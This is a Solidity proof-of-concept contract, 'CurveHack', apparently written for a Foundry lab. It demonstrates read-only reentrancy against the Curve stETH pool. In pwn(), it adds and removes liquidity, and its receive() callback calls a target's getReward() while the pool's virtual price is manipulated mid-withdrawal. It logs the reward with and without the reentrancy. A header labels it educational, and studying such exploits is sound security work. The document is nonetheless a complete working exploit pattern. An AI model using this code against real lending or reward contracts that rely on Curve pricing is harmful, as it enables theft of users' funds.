//SPDX-License-Identifier: UNLICENDED
pragma solidity 0.8.21;

import {console2} from "forge-std/Test.sol";
import {ICurve} from "./interfaces/ICurve.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {Constants} from "./Constants.sol";
import {Target} from "./Target.sol";

/**
 * @title  CurveHack Contract
 * @author cartlex
 * @notice This contract is for educational purposes only,
 *         do not use it in production.
 */
contract CurveHack is Constants {
    using SafeERC20 for IERC20;

    ICurve private constant POOL = ICurve(STETH_POOL);
    IERC20 private constant LP_TOKEN = IERC20(LP);
    Target private immutable target;

    constructor(Target _target) {
        target = _target;
    }

    receive() external payable {
        // get virtual price
        console2.log("during removing LP - virtual price", POOL.get_virtual_price());
        uint256 reward = target.getReward();

        console2.log("=========================================================");
        console2.log("reward with read-only reentrancy", reward);
        console2.log("=========================================================");
    }

    function setup() external payable {
        // add liquidity
        uint256[2] memory amounts = [msg.value, ZERO_VALUE];
        uint256 lp = POOL.add_liquidity{value: msg.value}(amounts, 1);

        IERC20(LP_TOKEN).safeIncreaseAllowance(address(target), lp);
        target.stake(lp);
    }

    function pwn() external payable {
        // add liquidity
        uint256[2] memory amounts = [msg.value, ZERO_VALUE];
        uint256 lp = POOL.add_liquidity{value: msg.value}(amounts, 1);
        // get virtual price
        console2.log("before removing LP - virtual price", POOL.get_virtual_price());
        // remove liquidity
        uint256[2] memory min_amounts = [ZERO_VALUE, ZERO_VALUE];
        POOL.remove_liquidity(lp, min_amounts);

        // Log get_virtual_price after liquidity removed
        console2.log("after remove LP - virtual price", POOL.get_virtual_price());

        uint256 reward = target.getReward();
        
        console2.log("=========================================================");
        console2.log("reward without read-only reentrancy", reward);
        console2.log("=========================================================");

    }
}
